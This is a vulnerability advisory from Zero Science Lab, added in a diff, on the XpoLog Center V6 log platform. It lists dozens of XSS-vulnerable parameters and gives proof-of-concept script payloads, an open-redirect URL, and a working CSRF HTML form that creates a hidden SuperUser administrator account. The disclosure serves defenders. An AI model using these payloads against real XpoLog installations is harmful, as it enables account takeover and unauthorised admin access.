@@ -1,0 +1,134 @@
+
+XpoLog Center V6 Multiple Remote Vulnerabilities
+
+
+Vendor: XpoLog LTD
+Product web page: http://www.xpolog.com
+Affected version: 6.4469
+                  6.4254
+                  6.4252
+                  6.4250
+                  6.4237
+                  6.4235
+                  5.4018
+
+Summary: Applications Log Analysis and Management Platform.
+
+Desc: XpoLog suffers from multiple vulnerabilities including
+XSS, Open Redirection and Cross-Site Request Forgery.
+
+Tested on: Apache-Coyote/1.1
+           Microsoft Windows Server 2012
+           Microsoft Windows 7 Professional SP1 EN 64bit
+           Java/1.7.0_45
+           Java/1.8.0.91
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5334
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5334.php
+
+
+14.06.2016
+
+--
+
+
+XSS:
+----
+
+http://10.0.0.17:30303/logeye/apps/admin/appAdminAction.jsp [actionType parameter]
+http://10.0.0.17:30303/logeye/apps/admin/appAdminAction.jsp [dataGenerationInterval parameter]
+http://10.0.0.17:30303/logeye/apps/admin/appAdminAction.jsp [desc parameter]
+http://10.0.0.17:30303/logeye/apps/admin/appAdminAction.jsp [key JSON parameter within the timeFrame parameter]
+http://10.0.0.17:30303/logeye/apps/admin/appAdminAction.jsp [name parameter]
+http://10.0.0.17:30303/logeye/apps/getData.jsp [id JSON parameter within the appsModelObj parameter]
+http://10.0.0.17:30303/logeye/common/addLogFilter.jsp [newFilterLabel parameter]
+http://10.0.0.17:30303/logeye/common/addLogFilter.jsp [tableStyle parameter]
+http://10.0.0.17:30303/logeye/common/buttonsFooter.jsp [actionNames parameter]
+http://10.0.0.17:30303/logeye/common/buttonsFooter.jsp [actions parameter]
+http://10.0.0.17:30303/logeye/common/buttonsFooter.jsp [align parameter]
+http://10.0.0.17:30303/logeye/common/buttonsFooter.jsp [baseDirectory parameter]
+http://10.0.0.17:30303/logeye/common/selectLog.jsp [ignoreHeader parameter]
+http://10.0.0.17:30303/logeye/common/validatePath.jsp [path parameter]
+http://10.0.0.17:30303/logeye/componentAction.jsp [forward parameter]
+http://10.0.0.17:30303/logeye/componentAction.jsp [mainPage parameter within the forward parameter]
+http://10.0.0.17:30303/logeye/dashboard/admin/dashboardAdministration.jsp [name of an arbitrarily supplied URL parameter]
+http://10.0.0.17:30303/logeye/dashboard/view/updateDashboardModel.jsp [viewBy parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/listenersAdminViewAccountsTable.jsp [type parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/listenersAdminViewAccountsTableContent.jsp [type parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [buttonsActions parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [buttonsAlign parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [buttonsColors parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [buttonsIds parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [buttonsTexts parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [divId parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [id parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [title parameter]
+http://10.0.0.17:30303/logeye/listeners/admin/popupDiv.jsp [titleImage parameter]
+http://10.0.0.17:30303/logeye/loggers/admin/logAdminGate.jsp [logType parameter]
+http://10.0.0.17:30303/logeye/monitor/monitorDefinition.jsp [name of an arbitrarily supplied URL parameter]
+http://10.0.0.17:30303/logeye/root.jsp [mainPage parameter]
+http://10.0.0.17:30303/logeye/settings/mailsetaction.jsp [HttpPort parameter]
+http://10.0.0.17:30303/logeye/settings/mailsetaction.jsp [SslProt parameter]
+http://10.0.0.17:30303/logeye/settings/saveopok.jsp [userMessage parameter]
+http://10.0.0.17:30303/logeye/settings/settings.jsp [message parameter]
+http://10.0.0.17:30303/logeye/support/basic/logsViewXML.jsp [clusterNode parameter]
+http://10.0.0.17:30303/logeye/tasks/xpotaskDefinition.jsp [ID parameter]
+http://10.0.0.17:30303/logeye/tasks/xpotaskDefinition.jsp [TASK_TYPE parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/addAccountAction.jsp [ACTION_TYPE parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/addAccountAction.jsp [Name parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/addAccountDiv.jsp [ACC_ID parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/addAccountDiv.jsp [ACC_TYPE parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/addAccountDiv.jsp [base_directory parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/addAccountDiv.jsp [divHeight parameter]
+http://10.0.0.17:30303/logeye/tools/addresses/db/general/driverHandler.jsp [url parameter]
+
+PoC:
+----
+
+POST /logeye/common/addLogFilter.jsp? HTTP/1.1
+Host: 10.0.0.17:30303
+
+baseDirectory=../&embedded=true&tableStyle=none&newFilterLabel=Match%20Text<script>alert(1)<%2fscript>8&ajaxTimestamp=1465928888471
+
+--
+
+GET /logeye/componentAction.jsp?selectedCompId=XpoLog&forward=root.jsp%3fmainPage%3dsettings%2fsettings.jsp><script>alert(2)</script> HTTP/1.1
+GET /logeye/root.jsp?mainPage=javascript:alert(3)//
+
+
+Open Redirect:
+--------------
+
+http://10.0.0.17:30303/logeye/componentAction.jsp?selectedCompId=XpoLog&forward=http://zeroscience.mk
+
+
+CSRF Add SuperUser:
+-------------------
+
+<html>
+  <body>
+    <form action="http://10.0.0.17:30303/logeye/security/management/userSettingsAction.jsp" method="POST">
+      <input type="hidden" name="isEditMode" value="false" />
+      <input type="hidden" name="username" value="testingus" />
+      <input type="hidden" name="password" value="123123" />
+      <input type="hidden" name="confirmPassword" value="123123" />
+      <input type="hidden" name="displayName" value="Tester" />
+      <input type="hidden" name="availableGroupsList" value="SuperUser" />
+      <input type="hidden" name="SelectedGroupsList" value="All" />
+      <input type="hidden" name="SelectedGroupsList" value="administrators" />
+      <input type="hidden" name="SelectedGroupsList" value="SuperUser" />
+      <input type="hidden" name="administeredGroupsList" value="All" />
+      <input type="hidden" name="SelectedAdministeredGroupsList" value="SuperUser" />
+      <input type="hidden" name="SelectedAdministeredGroupsList" value="administrators" />
+      <input type="hidden" name="SelectedAdministeredGroupsList" value="All" />
+      <input type="hidden" name="UserPolicy" value="sone" />
+      <input type="hidden" name="selectedPolicy" value="default" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
